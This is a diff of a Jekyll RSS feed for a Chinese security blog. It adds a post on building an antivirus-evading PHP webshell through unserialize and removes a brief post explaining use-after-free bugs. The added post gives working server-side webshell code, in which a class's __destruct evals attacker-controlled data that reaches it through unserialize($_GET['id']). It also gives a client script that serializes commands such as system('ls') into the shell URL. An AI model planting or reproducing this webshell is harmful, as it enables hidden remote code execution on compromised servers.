@@ -5,9 +5,83 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Tue, 18 Apr 2017 06:11:51 +0800</pubDate>
-    <lastBuildDate>Tue, 18 Apr 2017 06:11:51 +0800</lastBuildDate>
+    <pubDate>Tue, 18 Apr 2017 22:07:46 +0800</pubDate>
+    <lastBuildDate>Tue, 18 Apr 2017 22:07:46 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>unserialize免杀webshell</title>
+        <description>&lt;h3 id=&quot;php的unserialize函数&quot;&gt;php的unserialize函数&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
+对象对应的类有__wakeup,__destruct等函数,那么在unserialize函数执行后将执行对应的函数(__wakeup,__destruct等)
+
+refer:
+http://www.91ri.org/3960.html
+https://www.owasp.org/index.php/PHP_Object_Injection
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;利用unserialize构造webshell&quot;&gt;利用unserialize构造webshell&lt;/h3&gt;
+
+&lt;h4 id=&quot;服务端webshell&quot;&gt;服务端[webshell]&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+
+class foo{
+    public $data=&quot;text&quot;;
+        function __destruct()
+        {
+            eval($this-&amp;gt;data);
+        }
+
+}
+
+$file_name=$_GET['id'];
+unserialize($file_name);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;客户端相当于菜刀&quot;&gt;客户端[相当于菜刀]&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+
+class foo{
+    #public $data=&quot;phpinfo();&quot;;
+    public $data=&quot;system('ls');&quot;;
+
+}
+$a=new foo;
+$b=serialize($a);
+echo &quot;please visit uri:\n&quot;.&quot;[your shell page url]&quot;.&quot;?id=&quot;.$b;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;理解&quot;&gt;理解&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
+,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存
+的foo类模板的__wakeup,__destruct等函数,但是恰好这些函数会造成php代码执行[eval($this-&amp;gt;data)],且$this-&amp;gt;data可控.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;本文代码对应下载链接如下
+&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/unserializePHP&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</guid>
+        
+        <category>unserialize</category>
+        
+        <category>php</category>
+        
+        <category>webshell</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>vim技巧</title>
@@ -1258,26 +1332,6 @@ ip[eg.192.168.1.1]容易造成网络堵塞,造成内网无法访问互联网,也
         
         
         <category>auxilary</category>
-        
-      </item>
-    
-      <item>
-        <title>UAF漏洞</title>
-        <description>&lt;p&gt;0x00 理解&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf漏洞叫作&quot;释放后重引用&quot;漏洞,触发漏洞在于&quot;重引用&quot;这个动作,而重引用之前要通过&quot;占坑&quot;方式来修改要&quot;重引用&quot;的指针对
-应内存中的数据,然后&quot;重引用&quot;到变化了的构造好的数据,导致执行任意代码
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</link>
-        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</guid>
-        
-        <category>uaf</category>
-        
-        
-        <category>二进制</category>
         
       </item>
     
